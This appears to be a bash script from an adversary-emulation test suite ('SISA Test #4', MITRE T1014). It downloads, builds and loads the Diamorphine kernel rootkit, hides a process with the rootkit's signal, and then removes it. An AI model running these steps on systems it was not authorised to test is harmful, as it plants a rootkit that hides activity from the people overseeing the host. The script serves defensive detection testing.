#!/bin/bash

# SISA Test #4 - Loadable Kernel Module based Rootkit (Diamorphine)
# Loads Diamorphine kernel module, which hides itself and processes.

# Constants
REPO="https://github.com/m0nad/Diamorphine/"
REV="898810523aa2033f582a4a5903ffe453334044f9"
ROOTKIT_NAME="diamorphine"
ROOTKIT_PATH="/lib/modules/$(uname -r)/${ROOTKIT_NAME}.ko"
TMP_DIR="/tmp/sisa"
OUTPUT_DIR="./Linux_output/Defence_Evasion"
OUTPUT_FILE="${OUTPUT_DIR}/T1014_4_Defence_evasion.txt"

# Ensure the output directory exists
mkdir -p ${OUTPUT_DIR}

# Redirect all output to the output file
{
    echo "Defence Evasion T1014 is Executing..."

    # Prerequisites
    echo "Installing prerequisites..."
    sudo apt-get update -qq
    sudo apt-get install -y make gcc unzip curl
    echo "Prerequisites installed."

    # Clone and build the library
    echo "Cloning and building the library..."
    mkdir -p ${TMP_DIR} && cd ${TMP_DIR}
    curl -sLO ${REPO}/archive/${REV}.zip && unzip ${REV}.zip && cd Diamorphine-${REV}
    make
    sudo cp ${ROOTKIT_NAME}.ko ${ROOTKIT_PATH}
    sudo depmod -a
    echo "Library cloned and built."

    # Attack Commands
    echo "Running SISA Test #4 - Loadable Kernel Module based Rootkit (Diamorphine)"
    sudo modprobe ${ROOTKIT_NAME}
    ping -c 10 localhost >/dev/null & TARGETPID="$!"
    ps $TARGETPID
    kill -31 $TARGETPID
    ps $TARGETPID || echo "process ${TARGETPID} hidden"
    echo "SISA Test #4 completed."

    # Cleanup Commands
    echo "Cleaning up..."
    kill -63 1
    sudo modprobe -r ${ROOTKIT_NAME}
    sudo rm -rf ${ROOTKIT_PATH} ${TMP_DIR}
    sudo depmod -a
    echo "Cleanup completed."

    echo "Storing output in ${OUTPUT_FILE}..."
} &> ${OUTPUT_FILE}

echo "Execution of Defence Evasion T1014 complete. Output stored in ${OUTPUT_FILE}."
